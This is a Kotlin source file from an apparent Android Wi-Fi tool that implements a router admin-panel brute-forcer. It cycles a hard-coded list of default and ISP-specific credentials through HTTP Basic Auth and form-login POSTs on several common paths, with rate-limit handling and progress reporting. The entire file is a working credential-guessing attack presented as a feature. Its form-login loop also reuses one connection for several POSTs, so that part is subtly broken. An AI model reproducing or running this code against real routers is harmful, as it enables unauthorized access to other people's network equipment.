package com.alexcupsa.wifithermal.core.engine.router

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.Base64

sealed interface BruteForceResult {
    data class Success(val username: String, val password: String, val method: String) : BruteForceResult
    data object Exhausted : BruteForceResult
    data class Error(val message: String) : BruteForceResult
    data object RateLimited : BruteForceResult
}

data class BruteForceProgress(
    val attemptsMade: Int,
    val totalAttempts: Int,
    val currentCredential: String,
    val status: String,
)

object AdminBruteForce {

    private val DEFAULT_CREDENTIALS = listOf(
        "admin" to "admin",
        "admin" to "password",
        "admin" to "",
        "admin" to "1234",
        "admin" to "12345",
        "admin" to "123456",
        "admin" to "admin123",
        "root" to "root",
        "root" to "admin",
        "root" to "",
        "user" to "user",
        "user" to "password",
        "administrator" to "administrator",
        "administrator" to "admin",
        "guest" to "guest",
        "support" to "support",
        "service" to "service",
        "telecom" to "telecom",
        "admin" to "telekom",
        "admin" to "vodafone",
        "admin" to "fastweb",
        "admin" to "tim",
        "admin" to "wind",
        "admin" to "infostrada",
        "fastweb" to "fastweb",
        "telecomadmin" to "admintelecom",
        "vodafone" to "vodafone",
        "TimRouter" to "TimRouter",
        "alice" to "alice",
        "admin" to "sysadmin",
        "admin" to "motorola",
        "admin" to "conexant",
        "admin" to "epicrouter",
        "admin" to "Ascend",
        "admin" to "michelangelo",
        "admin" to "netgear",
        "admin" to "dlink",
        "admin" to "tplink",
        "admin" to "asus",
        "admin" to "linksys",
    )

    suspend fun bruteForce(
        routerInfo: RouterInfo,
        credentials: List<Pair<String, String>> = DEFAULT_CREDENTIALS,
        delayBetweenAttemptsMs: Long = 500,
        onProgress: (BruteForceProgress) -> Unit = {},
    ): BruteForceResult = withContext(Dispatchers.IO) {
        val baseUrl = buildBaseUrl(routerInfo) ?: return@withContext BruteForceResult.Error("No HTTP port found")
        val totalAttempts = credentials.size * 2

        var attemptsMade = 0
        var consecutiveFailures = 0

        for ((username, password) in credentials) {
            if (consecutiveFailures >= 10) {
                return@withContext BruteForceResult.RateLimited
            }

            attemptsMade++
            onProgress(
                BruteForceProgress(
                    attemptsMade = attemptsMade,
                    totalAttempts = totalAttempts,
                    currentCredential = "$username:***",
                    status = "Trying Basic Auth",
                )
            )

            val basicResult = tryBasicAuth(baseUrl, username, password)
            when (basicResult) {
                is AuthAttemptResult.Success -> {
                    return@withContext BruteForceResult.Success(username, password, "Basic Auth")
                }
                is AuthAttemptResult.RateLimited -> {
                    consecutiveFailures++
                    delay(delayBetweenAttemptsMs * 3)
                    continue
                }
                is AuthAttemptResult.Failed -> {
                    consecutiveFailures = 0
                }
                is AuthAttemptResult.Error -> {
                    consecutiveFailures++
                }
            }

            delay(delayBetweenAttemptsMs)

            attemptsMade++
            onProgress(
                BruteForceProgress(
                    attemptsMade = attemptsMade,
                    totalAttempts = totalAttempts,
                    currentCredential = "$username:***",
                    status = "Trying Form POST",
                )
            )

            val formResult = tryFormLogin(baseUrl, username, password)
            when (formResult) {
                is AuthAttemptResult.Success -> {
                    return@withContext BruteForceResult.Success(username, password, "Form POST")
                }
                is AuthAttemptResult.RateLimited -> {
                    consecutiveFailures++
                    delay(delayBetweenAttemptsMs * 3)
                    continue
                }
                is AuthAttemptResult.Failed -> {
                    consecutiveFailures = 0
                }
                is AuthAttemptResult.Error -> {
                    consecutiveFailures++
                }
            }

            delay(delayBetweenAttemptsMs)
        }

        BruteForceResult.Exhausted
    }

    private fun buildBaseUrl(routerInfo: RouterInfo): String? {
        return when {
            routerInfo.httpsPort != null -> "https://${routerInfo.gatewayIp}:${routerInfo.httpsPort}"
            routerInfo.httpPort != null -> "http://${routerInfo.gatewayIp}:${routerInfo.httpPort}"
            else -> "http://${routerInfo.gatewayIp}"
        }
    }

    private sealed interface AuthAttemptResult {
        data object Success : AuthAttemptResult
        data object Failed : AuthAttemptResult
        data object RateLimited : AuthAttemptResult
        data class Error(val message: String) : AuthAttemptResult
    }

    private suspend fun tryBasicAuth(baseUrl: String, username: String, password: String): AuthAttemptResult =
        withContext(Dispatchers.IO) {
            runCatching {
                val url = URL(baseUrl)
                val connection = url.openConnection() as HttpURLConnection
                connection.connectTimeout = 5000
                connection.readTimeout = 5000
                connection.requestMethod = "GET"
                connection.instanceFollowRedirects = false

                val credentials = "$username:$password"
                val encoded = Base64.getEncoder().encodeToString(credentials.toByteArray())
                connection.setRequestProperty("Authorization", "Basic $encoded")

                val responseCode = connection.responseCode
                connection.disconnect()

                when {
                    responseCode in 200..299 -> AuthAttemptResult.Success
                    responseCode == 401 || responseCode == 403 -> AuthAttemptResult.Failed
                    responseCode == 429 -> AuthAttemptResult.RateLimited
                    else -> AuthAttemptResult.Failed
                }
            }.getOrElse { e ->
                AuthAttemptResult.Error(e.message.orEmpty())
            }
        }

    private suspend fun tryFormLogin(baseUrl: String, username: String, password: String): AuthAttemptResult =
        withContext(Dispatchers.IO) {
            val loginPaths = listOf("/login", "/cgi-bin/login", "/admin/login", "/")

            for (path in loginPaths) {
                val result = tryFormLoginOnPath(baseUrl, path, username, password)
                if (result is AuthAttemptResult.Success) {
                    return@withContext result
                }
            }

            AuthAttemptResult.Failed
        }

    private suspend fun tryFormLoginOnPath(
        baseUrl: String,
        path: String,
        username: String,
        password: String,
    ): AuthAttemptResult = withContext(Dispatchers.IO) {
        runCatching {
            val url = URL("$baseUrl$path")
            val connection = url.openConnection() as HttpURLConnection
            connection.connectTimeout = 5000
            connection.readTimeout = 5000
            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.instanceFollowRedirects = false
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")

            val formFields = listOf(
                "username=$username&password=$password",
                "user=$username&pass=$password",
                "login=$username&pwd=$password",
                "admin=$username&passwd=$password",
            )

            for (formData in formFields) {
                connection.outputStream.use { output ->
                    OutputStreamWriter(output).use { writer ->
                        writer.write(formData)
                        writer.flush()
                    }
                }

                val responseCode = connection.responseCode
                val responseBody = runCatching {
                    connection.inputStream.bufferedReader().readText()
                }.getOrElse { "" }

                val isSuccess = responseCode in 200..399 &&
                    !responseBody.contains("invalid", ignoreCase = true) &&
                    !responseBody.contains("error", ignoreCase = true) &&
                    !responseBody.contains("failed", ignoreCase = true) &&
                    !responseBody.contains("incorrect", ignoreCase = true) &&
                    (responseBody.contains("dashboard", ignoreCase = true) ||
                        responseBody.contains("welcome", ignoreCase = true) ||
                        responseBody.contains("status", ignoreCase = true) ||
                        responseBody.contains("logout", ignoreCase = true) ||
                        responseCode == 302)

                if (isSuccess) {
                    connection.disconnect()
                    return@withContext AuthAttemptResult.Success
                }

                if (responseCode == 429) {
                    connection.disconnect()
                    return@withContext AuthAttemptResult.RateLimited
                }
            }

            connection.disconnect()
            AuthAttemptResult.Failed
        }.getOrElse { e ->
            AuthAttemptResult.Error(e.message.orEmpty())
        }
    }

    fun estimateTime(credentialCount: Int, delayMs: Long): Long {
        return credentialCount * 2 * (delayMs + 200)
    }
}
